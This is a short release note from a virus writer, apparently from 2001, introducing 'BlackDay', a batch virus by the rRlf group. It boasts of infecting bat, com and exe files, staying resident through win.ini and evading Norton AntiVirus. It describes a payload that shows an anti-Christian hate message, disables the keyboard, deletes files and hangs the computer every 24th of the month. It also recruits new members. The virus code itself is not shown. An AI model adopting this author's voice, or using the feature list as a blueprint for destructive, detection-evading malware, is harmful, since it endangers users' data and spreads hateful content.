This is my third virus (February, 2001). Until now, I have just written asm-ViRii, and I said to myself, such a nice little batch-virus, would not be bad. Well, it is not bad, but it also does not offer some new features (except the bit unusual residency-routine). Well, there it is: 

BlackDay phinal: 

bat-, com-, exe-infector 
parasitic 
residency through win.ini 
retro: Norton AntiVirus 2000; newest version, it does not recognize the virus, even if heuristic is at maximum; but: if full heuristic, Norton AntiVirus 2000 brings the following message while the payload is running: "virus-like activity: deltree.exe disregards the read-only attribute of jrandom.file" ... at this point, the user ought to type in, what to do, but the keyboard is already deactivated, so NortonAV hangs the computer 
uses ".."-method to change directories 
copies the infection-routine als call-back to the root-directory 
size: 2.125 bytes 
payloads: every 24th of a month (in chronological order) 
		->message: 
			I hate Jesus Christ and his phuckin Birthday.
			For me is the 24th of December just another BlackDay in a dark World.
			For you now, every 24th gets such a BlackDay.
			The same for your phuckin System, too.
			..

		->mouse and keyboard are deactivated, the victim has to sit and watch
		 his computer going down (well, he could just turn it off, and leave it
		 alone for the 24th)
		->...its d357r0yIn6-7im3 !!!!!
		->the computer hangs

Gr33tz go t0: 7r!NT [rRlf], El DudErin0 [rRlf], rastafarie [rRlf], TeAgeCe [rRlf], Zarrmann, 648!, Zoom23 [PVW] 

The -=[Ready Rangers Liberation Front]=- is searching for memberz. If you are interested, come to our page: www.readyrangers.de.vu If you are not interested ... come nevertheless. 

Well, here is the commented script (if you want to "compile" the virus, you have to delete the comments; name the phile BlackDay.bat, otherwise it would not work right). [bd-ptrr = BlackDay-PhileT0a$t3rReadyRangers] Thats it then for now ... cu all 

Peace!
